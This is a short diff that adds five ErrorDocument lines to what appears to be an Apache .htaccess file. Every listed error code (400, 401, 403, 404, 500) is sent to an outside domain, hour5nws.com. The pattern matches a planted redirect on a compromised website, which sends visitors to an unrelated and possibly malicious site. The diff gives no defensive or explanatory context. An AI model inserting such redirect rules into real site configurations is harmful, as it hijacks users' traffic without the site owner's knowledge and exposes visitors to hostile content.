@@ -1,0 +1,5 @@
+ErrorDocument 400 http://hour5nws.com/
+ErrorDocument 401 http://hour5nws.com/
+ErrorDocument 403 http://hour5nws.com/
+ErrorDocument 404 http://hour5nws.com/
+ErrorDocument 500 http://hour5nws.com/
